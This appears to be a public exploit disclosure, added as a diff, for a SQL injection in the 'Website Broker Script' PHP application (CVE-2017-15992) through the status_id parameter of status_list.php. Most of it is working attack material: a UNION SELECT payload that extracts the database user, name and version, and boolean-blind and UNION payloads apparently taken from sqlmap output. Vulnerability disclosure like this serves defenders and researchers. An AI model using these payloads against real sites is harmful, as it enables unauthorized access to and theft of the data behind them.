@@ -1,0 +1,36 @@
+# # # # # 
+# Exploit Title: Website Broker Script - 'status_id' Parameter SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software Link: http://www.exclusivescript.com/product/UwCG4464436/php-scripts/website-broker-script
+# Demo: http://www.officialwebsiteforsale.com/official/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15992
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/status_list.php?status_id=[SQL]
+# 
+# -12'++/*!50000UNION*/+/*!50000SELECT*/+1,2,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),4,5--+-
+# 
+# Parameter: status_id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: status_id=12' AND 2717=2717 AND 'fNVA'='fNVA
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 5 columns
+#     Payload: status_id=-1351' UNION ALL SELECT NULL,CONCAT(0x71716b7a71,0x4857455572714d7a48506145547643734d6b794f515a506d6469764f5666736c6d754c7468444178,0x716a6b6271),NULL,NULL,NULL-- AJcv
+# 
+# Etc..
+# # # # #
